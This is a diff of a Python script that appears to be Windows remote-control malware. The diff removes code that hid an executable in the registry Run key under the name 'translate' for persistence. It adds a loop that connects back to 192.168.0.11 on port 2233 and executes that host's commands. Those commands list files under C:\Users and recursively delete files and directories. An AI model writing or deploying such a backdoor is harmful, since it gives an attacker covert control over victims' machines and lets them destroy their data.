@@ -1,25 +1,15 @@
 #!/usr/bin/python
-# -*- coding: UTF-8 -*-
-import win32api
-import win32con
+# -*- coding: UTF-8 -*
+#pip install pypiwin32
 import os
+import socket
+import time
 
 path = r"C:\Users"
 
-class AutoRun():
-	def __init__(self):
-		name = 'translate'  # 要添加的项值名称
-		path = r'C:\sun32\center\windows\c.exe'  # 要添加的exe路径
-		# 注册表项名
-		KeyName = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
-		# 异常处理
-
-		key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,  KeyName, 0,  win32con.KEY_ALL_ACCESS)
-		win32api.RegSetValueEx(key, name, 0, win32con.REG_SZ, path)
-		win32api.RegCloseKey(key)
-
 
 def list_all_path():
+	global path
 	all_list = []
 	for root , dirs, files in os.walk(path):
 		for x in files:
@@ -30,7 +20,22 @@ def list_all_path():
 	return all_list
 
 
+def remove_dir(dir):
+	#用于删除路径的函数
+	dir = dir.replace('\\', '/')
+	if(os.path.isdir(dir)):
+		for p in os.listdir(dir):
+			remove_dir(os.path.join(dir,p))
+		if(os.path.exists(dir)):
+			os.rmdir(dir)
+	else:
+		if(os.path.exists(dir)):
+			os.remove(dir)
+
+
 def linux_to_os(cmd):
+
+	global path
 
 	re = "none"
 	cmd = cmd.split(' ')
@@ -50,16 +55,50 @@ def linux_to_os(cmd):
 		wz = len(list_p) - 1
 		del list_p[wz]
 
-		path = list_p.join("\\")
+		path = "\\".join(list_p)
+
+	elif cmd[0] == "rmr":
+
+		remove_dir(cmd[1])
+
+
+	elif cmd[0] == "rm":
+
+		os.remove(cmd[1])
+		
 
 	return re
 
 
 def main():
 
+	global path
 
+	while True:
+		sock = socket.socket()
+		HOST = "192.168.0.11"
+		PORT = 2233
+		sock.connect((HOST, PORT))
+		#发送模式
+		sock.sendall("hello".encode())
+		server = sock.recv(1024).decode()
+
+		if server != "stop":
+			break
+		else:
+			sock.close()
+			time.sleep(10)
+
+	sock.sendall("hello".encode())
+
+	while True:
+		re = sock.recv(1024).decode()
+		over = linux_to_os(re)
+		sock.sendall(over.encode())
+
+		
 
 if __name__=='__main__':
+	main()
 
-    auto=AutoRun()
 
